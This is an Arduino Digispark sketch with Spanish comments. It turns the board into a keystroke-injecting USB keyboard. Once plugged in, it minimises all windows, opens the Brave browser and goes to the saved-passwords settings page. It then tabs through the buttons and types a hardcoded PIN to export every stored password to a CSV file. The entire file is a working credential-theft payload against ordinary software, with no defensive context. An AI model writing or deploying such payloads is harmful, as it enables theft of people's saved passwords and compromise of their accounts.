#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Codigo hexa para flecha abajo
#define KEY_ENTER 0x28 //codigo hexa para enter
#define KEY_TAB 0x2b //codigo hexa para tabulador 
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT); //minimizamos todas las ventanas 
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // presionamos las teclas windows+R
  DigiKeyboard.delay(500);
  DigiKeyboard.print("brave.exe"); //accedemos al navegador en uso
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1200);
  DigiKeyboard.print("brave://settings/passwords"); // entramos a la url donde se encuentran las contraseñas guardadas del navegador
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_DOWN);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("0398");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // con las lineas de comando nos desplazamos entre botones para asi realizar la exportacion de las contraseñas guardadas en documentos en un archivos csv
  DigiKeyboard.delay(2000);
  
  for(;;){}

}
